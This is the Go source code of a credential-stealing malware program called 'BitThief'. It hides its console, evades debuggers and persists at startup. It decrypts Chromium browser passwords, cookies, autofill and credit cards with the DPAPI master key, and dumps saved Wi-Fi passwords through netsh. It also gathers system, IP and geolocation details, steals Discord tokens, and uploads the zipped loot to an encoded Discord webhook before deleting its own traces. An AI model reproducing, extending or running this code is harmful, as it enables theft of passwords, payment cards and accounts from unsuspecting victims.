package main

import (
	"archive/zip"
	"bytes"
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/v3/mem"
)

const (
	outputDir    = "Vault"
	localAppData = "LOCALAPPDATA"
	username     = "BitThief"
	avatar_url   = "https://pixabay.com/get/ga83e71eaed528e5a0702a216878e4595c8c18088c96da855a22f9527375afcbd9261367c9e5d45f112866d96af682d777216d78b96c3b9ba4fdcb47e991d9d93a4472770ca894004ec41457f18693fc6_640.jpg"
)

type (
	BrowserData struct {
		History     []HistoryEntry
		Logins      []LoginEntry
		Cookies     []CookieEntry
		Bookmarks   []BookmarkEntry
		Autofill    []AutofillEntry
		CreditCards []CreditCardEntry
	}

	HistoryEntry struct {
		URL       string    `json:"url"`
		Title     string    `json:"title"`
		VisitedAt time.Time `json:"visited_at"`
		Browser   string    `json:"browser"`
	}

	LoginEntry struct {
		URL      string `json:"url"`
		Username string `json:"username"`
		Password string `json:"password"`
		Browser  string `json:"browser"`
	}

	CookieEntry struct {
		Host    string `json:"host"`
		Name    string `json:"name"`
		Path    string `json:"path"`
		Value   string `json:"value"`
		Expires int64  `json:"expires"`
		Browser string `json:"browser"`
	}

	BookmarkEntry struct {
		Name    string `json:"name"`
		URL     string `json:"url"`
		Browser string `json:"browser"`
	}

	AutofillEntry struct {
		Name    string `json:"name"`
		Value   string `json:"value"`
		Browser string `json:"browser"`
	}

	CreditCardEntry struct {
		Name     string `json:"name"`
		ExpMonth int    `json:"exp_month"`
		ExpYear  int    `json:"exp_year"`
		Number   string `json:"number"`
		Browser  string `json:"browser"`
	}

	TokenInfo struct {
		Username  string `json:"username"`
		Token     string `json:"token"`
		Nitro     string `json:"nitro"`
		Billing   string `json:"billing"`
		MFA       bool   `json:"mfa"`
		Email     string `json:"email"`
		Phone     string `json:"phone"`
		Avatar    string `json:"avatar"`
		HQGuilds  string `json:"hq_guilds"`
		HQFriends string `json:"hq_friends"`
		GiftCodes string `json:"gift_codes"`
		Badges    string `json:"badges"`
	}

	DiscordEmbed struct {
		Title       string         `json:"title"`
		Description string         `json:"description,omitempty"`
		Color       int            `json:"color"`
		Fields      []DiscordField `json:"fields"`
		Thumbnail   *Thumbnail     `json:"thumbnail,omitempty"`
		Footer      DiscordFooter  `json:"footer"`
		Timestamp   string         `json:"timestamp"`
	}

	DiscordField struct {
		Name   string `json:"name"`
		Value  string `json:"value"`
		Inline bool   `json:"inline"`
	}

	Thumbnail struct {
		URL string `json:"url"`
	}

	DiscordFooter struct {
		Text string `json:"text"`
	}

	SystemInfo struct {
		Username     string
		ComputerName string
		OS           string
		CPU          string
		RAM          string
		GPU          string
		HWID         string
	}
)

const CRYPTPROTECT_UI_FORBIDDEN = 0x1

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

var (
	modcrypt32             = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = modcrypt32.NewProc("CryptUnprotectData")
	modkernel32            = syscall.NewLazyDLL("kernel32.dll")
	procLocalFree          = modkernel32.NewProc("LocalFree")
	user32                 = syscall.NewLazyDLL("user32.dll")
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	getConsoleWindow       = kernel32.NewProc("GetConsoleWindow")
	showWindow             = user32.NewProc("ShowWindow")
)

var webhookURLencoded string

const SW_HIDE = 0

func main() {
	config := NewConfig()
	webhookURLencoded = config.Webhook
	if webhookURLencoded == "" {
		log.Fatal("Webhook URL not set")
		os.Exit(1)
	}

	hideConsole()

	if config.AntiDebug {
		ad := NewAntiDebug()
		if ad.checks(*config) {
			os.Exit(0)
		}
	}

	if config.Startup {
		if err := AddStartup(); err != nil {
			log.Fatalf("Startup error: %v", err)
		}
	}

	if config.BrowserStealer {
		browsers := make(map[string]string)
		for key, value := range encodedBrowsers {
			browsers[decodeBase64(key)] = decodeBase64(value)
		}

		os.MkdirAll(outputDir, 0755)
		defer cleanup()

		appData := os.Getenv(localAppData)
		if appData == "" {
			log.Fatal("LOCALAPPDATA environment variable not set")
		}

		data := collectBrowserData(appData, browsers)
		writeDataFiles(data)
		wifiPasswords := getWiFiPasswords()
		writeFile(filepath.Join(outputDir, "wifi.txt"), wifiPasswords)

		zipPath := outputDir + ".zip"
		createZip(zipPath)

		sendFileToDiscord(zipPath)
	}
	if config.DiscordInject {
		if err := InjectDiscord(getWebhookURL()); err != nil {
			log.Fatalf("Injection error: %v", err)
		}
	}

	if config.BrowserStealer {
		sysInfo := getSystemInfo()
		fileSizes := make(map[string]int64)
		_ = filepath.Walk(outputDir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() {
				fileSizes[info.Name()] = info.Size()
			}
			return nil
		})
		browserEmbed := createBrowserEmbed(fileSizes, sysInfo)
		sendEmbedToDiscord(browserEmbed)
	}

	if config.tokenStealer {
		ft := NewFetchTokens()
		tokenInfoList := ft.Upload(true)
		var tokenInfo *TokenInfo
		if len(tokenInfoList) > 0 {
			var tokenData map[string]interface{}
			if err := json.Unmarshal([]byte(tokenInfoList[0]), &tokenData); err == nil {
				tokenInfo = &TokenInfo{
					Username:  tokenData["username"].(string),
					Token:     tokenData["token"].(string),
					Nitro:     tokenData["nitro"].(string),
					MFA:       tokenData["mfa"].(bool),
					Email:     tokenData["email"].(string),
					Phone:     tokenData["phone"].(string),
					Avatar:    tokenData["avatar"].(string),
					HQGuilds:  tokenData["hq_guilds"].(string),
					HQFriends: tokenData["hq_friends"].(string),
					GiftCodes: tokenData["gift_codes"].(string),
					Badges:    tokenData["badges"].(string),
				}
			}
		}
		if tokenInfo != nil {
			tokenEmbed := createTokenEmbed(tokenInfo)
			sendEmbedToDiscord(tokenEmbed)
		}
	}

	createCleanupBatch()
}

func decodeBase64(encoded string) string {
	decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	return string(decodedBytes)
}

func getWebhookURL() string {
	webhookURLBytes, err := base32.StdEncoding.DecodeString(webhookURLencoded)
	if err != nil {
		log.Fatal(err)
	}
	return string(webhookURLBytes)
}

func sendFileToDiscord(filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		log.Fatal(err)
	}
	_, err = io.Copy(part, file)
	if err != nil {
		log.Fatal(err)
	}

	payload := map[string]interface{}{
		"content":    "Vault file",
		"username":   username,
		"avatar_url": avatar_url,
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		log.Fatal(err)
	}
	writer.WriteField("payload_json", string(payloadJSON))
	writer.Close()

	req, err := http.NewRequest("POST", getWebhookURL(), body)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		log.Printf("Discord file upload response: %s", resp.Status)
	}
}

func sendEmbedToDiscord(embed DiscordEmbed) {
	payload := map[string]interface{}{
		"username":   username,
		"avatar_url": avatar_url,
		"embeds":     []DiscordEmbed{embed},
	}
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		log.Fatal(err)
	}
	req, err := http.NewRequest("POST", getWebhookURL(), bytes.NewBuffer(payloadJSON))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		log.Printf("Discord embed message response: %s", resp.Status)
	}
}

func getUserData() (string, string, bool) {
	displayName := os.Getenv("USERNAME")
	hostname := os.Getenv("COMPUTERNAME")
	username := os.Getenv("USERNAME")
	value := fmt.Sprintf("```Display Name: %s\nHostname: %s\nUsername: %s```", displayName, hostname, username)
	return ":bust_in_silhouette: User", value, false
}

func getSystemData(sysInfo SystemInfo) (string, string, bool) {
	value := fmt.Sprintf("```OS: %s\nCPU: %s\nGPU: %s\nRAM: %s\nHWID: %s```",
		sysInfo.OS, sysInfo.CPU, sysInfo.GPU, sysInfo.RAM, sysInfo.HWID)
	return "<:CPU:1004131852208066701> System", value, false
}

func getDiskData() (string, string, bool) {
	partitions, err := disk.Partitions(false)
	if err != nil {
		return ":floppy_disk: Disk", "Unable to get disk info", false
	}
	header := fmt.Sprintf("%-9s %-7s %-7s %-5s\n", "Drive", "Free", "Total", "Use%")
	lines := header
	for _, p := range partitions {
		if strings.Contains(strings.ToLower(p.Opts), "cdrom") || p.Fstype == "" {
			continue
		}
		usage, err := disk.Usage(p.Mountpoint)
		if err != nil {
			continue
		}
		freeGB := usage.Free / (1024 * 1024 * 1024)
		totalGB := usage.Total / (1024 * 1024 * 1024)
		line := fmt.Sprintf("%-9s %-7d %-7d %-5.1f%%\n", p.Device, freeGB, totalGB, usage.UsedPercent)
		lines += line
	}
	return ":floppy_disk: Disk", fmt.Sprintf("```%s```", lines), false
}

func getNetworkData() (string, string, bool) {
	resp, err := http.Get("https://www.cloudflare.com/cdn-cgi/trace")
	if err != nil {
		return ":satellite: Network", "Unable to get public IP", false
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return ":satellite: Network", "Unable to read IP response", false
	}
	lines := strings.Split(string(body), "\n")
	var ip string
	for _, line := range lines {
		if strings.HasPrefix(line, "ip=") {
			ip = strings.TrimPrefix(line, "ip=")
			break
		}
	}
	if ip == "" {
		ip = "Unknown"
	}
	interfaces, err := net.Interfaces()
	mac := "Unknown"
	if err == nil {
		for _, iface := range interfaces {
			if len(iface.HardwareAddr) > 0 {
				mac = iface.HardwareAddr.String()
				break
			}
		}
	}
	geoResp, err := http.Get("https://ipapi.co/" + ip + "/json/")
	var geoData struct {
		Country string `json:"country_name"`
		Region  string `json:"region"`
		City    string `json:"city"`
		Postal  string `json:"postal"`
		ASN     string `json:"asn"`
	}
	if err == nil {
		defer geoResp.Body.Close()
		json.NewDecoder(geoResp.Body).Decode(&geoData)
	}
	value := fmt.Sprintf("```IP Address: %s\nMAC Address: %s\nCountry: %s\nRegion: %s\nCity: %s (%s)\nISP: %s```",
		ip, mac, geoData.Country, geoData.Region, geoData.City, geoData.Postal, geoData.ASN)
	return ":satellite: Network", value, false
}

func getMasterKey(browserPath string) ([]byte, error) {
	localStatePath := filepath.Join(browserPath, "Local State")
	data, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var state struct {
		OSCrypt struct {
			Key string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.Key)
	if err != nil {
		return nil, err
	}

	encryptedKey = encryptedKey[5:]

	decryptedData, err := decryptWithDPAPI(encryptedKey)
	if err != nil {
		return nil, err
	}

	return decryptedData, nil
}

func CryptUnprotectData(data []byte) ([]byte, error) {
	var inBlob DATA_BLOB
	inBlob.cbData = uint32(len(data))
	inBlob.pbData = &data[0]

	var outBlob DATA_BLOB
	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		uintptr(CRYPTPROTECT_UI_FORBIDDEN),
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, err
	}

	defer LocalFree(outBlob.pbData)

	decryptedData := make([]byte, outBlob.cbData)
	copy(decryptedData, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData])

	return decryptedData, nil
}

func LocalFree(ptr *byte) {
	procLocalFree.Call(uintptr(unsafe.Pointer(ptr)))
}

func decryptWithDPAPI(data []byte) ([]byte, error) {
	return CryptUnprotectData(data)
}

func writeDataFiles(data BrowserData) {
	writeJSON(filepath.Join(outputDir, "history.json"), data.History)
	writeJSON(filepath.Join(outputDir, "logins.json"), data.Logins)
	writeJSON(filepath.Join(outputDir, "cookies.json"), data.Cookies)
	writeJSON(filepath.Join(outputDir, "bookmarks.json"), data.Bookmarks)
	writeJSON(filepath.Join(outputDir, "autofill.json"), data.Autofill)
	writeJSON(filepath.Join(outputDir, "creditcards.json"), data.CreditCards)
}

func writeJSON(path string, data interface{}) {
	file, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return
	}
	ioutil.WriteFile(path, file, 0644)
}

func writeFile(path string, content string) {
	ioutil.WriteFile(path, []byte(content), 0644)
}

func getWiFiPasswords() string {
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, _ := cmd.Output()
	profiles := parseWiFiProfiles(string(output))

	var result strings.Builder
	for _, profile := range profiles {
		cmd := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear")
		output, _ := cmd.Output()
		password := parseWiFiPassword(string(output))
		result.WriteString(fmt.Sprintf("%s: %s\n", profile, password))
	}
	return result.String()
}

func parseWiFiProfiles(output string) []string {
	var profiles []string
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(line, "All User Profile") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) > 1 {
				profiles = append(profiles, strings.TrimSpace(parts[1]))
			}
		}
	}
	return profiles
}

func parseWiFiPassword(output string) string {
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(line, "Key Content") {
			parts := strings.SplitN(line, ":", 2)
			if len(parts) > 1 {
				return strings.TrimSpace(parts[1])
			}
		}
	}
	return "N/A"
}

func getSystemInfo() SystemInfo {
	user := os.Getenv("USERNAME")
	ComputerName := os.Getenv("COMPUTERNAME")

	cmd := exec.Command("powershell", "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption + ' ' + (Get-CimInstance -ClassName Win32_OperatingSystem).Version + ' Build ' + (Get-CimInstance -ClassName Win32_OperatingSystem).BuildNumber")
	osInfoBytes, _ := cmd.Output()
	osInfo := strings.TrimSpace(string(osInfoBytes))

	memInfo, _ := mem.VirtualMemory()

	cmd3 := exec.Command("powershell", "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name")
	cpuInfoBytes, _ := cmd3.Output()
	cpuInfo := strings.TrimSpace(string(cpuInfoBytes))

	cmd4 := exec.Command("powershell", "(Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name)")
	GpuInfoBytes, _ := cmd4.Output()
	GpuInfo := strings.TrimSpace(string(GpuInfoBytes))

	cmd5 := exec.Command("powershell", "Get-WmiObject Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID")
	HWIDBytes, _ := cmd5.Output()
	HWID := strings.TrimSpace(string(HWIDBytes))

	return SystemInfo{
		Username:     user,
		ComputerName: ComputerName,
		OS:           osInfo,
		CPU:          cpuInfo,
		RAM:          fmt.Sprintf("%.2f GB", float64(memInfo.Total)/1024/1024/1024),
		GPU:          GpuInfo,
		HWID:         HWID,
	}
}

func createZip(zipPath string) {
	zipFile, err := os.Create(zipPath)
	if err != nil {
		log.Fatal(err)
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	filepath.Walk(outputDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		zipFileWriter, err := zipWriter.Create(info.Name())
		if err != nil {
			return err
		}

		_, err = io.Copy(zipFileWriter, file)
		return err
	})
}

func cleanup() {
	os.RemoveAll(outputDir)
}

func hideConsole() {
	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, SW_HIDE)
	}
}

func createCleanupBatch() {
	batchContent := `
@echo off
timeout /t 5 /nobreak > NUL
del /f /q myprogam.exe
del /f /q ` + outputDir + `.zip
del %0
`
	ioutil.WriteFile("cleanup.bat", []byte(batchContent), 0644)
	exec.Command("cmd", "/C", "start", "/B", "cleanup.bat").Run()
}

func createBrowserEmbed(fileSizes map[string]int64, sysInfo SystemInfo) DiscordEmbed {
	var filesBuilder strings.Builder
	for name, size := range fileSizes {
		filesBuilder.WriteString(fmt.Sprintf("**%s** - `%d bytes`\n", name, size))
	}

	userName, userValue, userInline := getUserData()
	systemName, systemValue, systemInline := getSystemData(sysInfo)
	diskName, diskValue, diskInline := getDiskData()
	networkName, networkValue, networkInline := getNetworkData()

	fields := []DiscordField{
		{Name: "📂 Files Included", Value: filesBuilder.String(), Inline: false},
		{Name: userName, Value: userValue, Inline: userInline},
		{Name: systemName, Value: systemValue, Inline: systemInline},
		{Name: diskName, Value: diskValue, Inline: diskInline},
		{Name: networkName, Value: networkValue, Inline: networkInline},
	}

	return DiscordEmbed{
		Title:       "🖥️ Browser Data Report",
		Description: "A zipped folder containing extracted browser data is attached below.",
		Color:       0x3498db,
		Fields:      fields,
		Footer:      DiscordFooter{Text: "Data extraction completed successfully 🚀"},
		Timestamp:   time.Now().UTC().Format(time.RFC3339),
	}
}

func createTokenEmbed(tokenInfo *TokenInfo) DiscordEmbed {
	formatValue := func(s string) string {
		if s == "" {
			return "None"
		}
		return s
	}

	mfaStatus := "False"
	if tokenInfo.MFA {
		mfaStatus = "True"
	}

	fields := []DiscordField{
		{Name: "<a:pinkcrown:996004209667346442> Token:", Value: fmt.Sprintf("```%s```", tokenInfo.Token), Inline: false},
		{Name: "<a:nitroboost:996004213354139658> Nitro:", Value: tokenInfo.Nitro, Inline: true},
		{Name: "<a:redboost:996004230345281546> Badges:", Value: formatValue(tokenInfo.Badges), Inline: true},
		{Name: "<a:pinklv:996004222090891366> Billing:", Value: formatValue(tokenInfo.Billing), Inline: true},
		{Name: "<:mfa:1021604916537602088> MFA:", Value: mfaStatus, Inline: true},
		{Name: "\u200b", Value: "\u200b", Inline: false},
		{Name: "<a:rainbowheart:996004226092245072> Email:", Value: formatValue(tokenInfo.Email), Inline: true},
		{Name: "<:starxglow:996004217699434496> Phone:", Value: formatValue(tokenInfo.Phone), Inline: true},
		{Name: "\u200b", Value: "\u200b", Inline: false},
	}

	if tokenInfo.HQGuilds != "" {
		fields = append(fields, DiscordField{Name: "<a:earthpink:996004236531859588> HQ Guilds:", Value: tokenInfo.HQGuilds, Inline: false})
		fields = append(fields, DiscordField{Name: "\u200b", Value: "\u200b", Inline: false})
	}

	if tokenInfo.HQFriends != "" {
		fields = append(fields, DiscordField{Name: "<a:earthpink:996004236531859588> HQ Friends:", Value: tokenInfo.HQFriends, Inline: false})
		fields = append(fields, DiscordField{Name: "\u200b", Value: "\u200b", Inline: false})
	}

	if tokenInfo.GiftCodes != "" {
		fields = append(fields, DiscordField{Name: "<a:gift:1021608479808569435> Gift Codes:", Value: tokenInfo.GiftCodes, Inline: false})
		fields = append(fields, DiscordField{Name: "\u200b", Value: "\u200b", Inline: false})
	}

	return DiscordEmbed{
		Title:     tokenInfo.Username,
		Color:     0x000000,
		Thumbnail: &Thumbnail{URL: tokenInfo.Avatar},
		Fields:    fields,
		Footer:    DiscordFooter{Text: "Token info gathered 📊"},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}
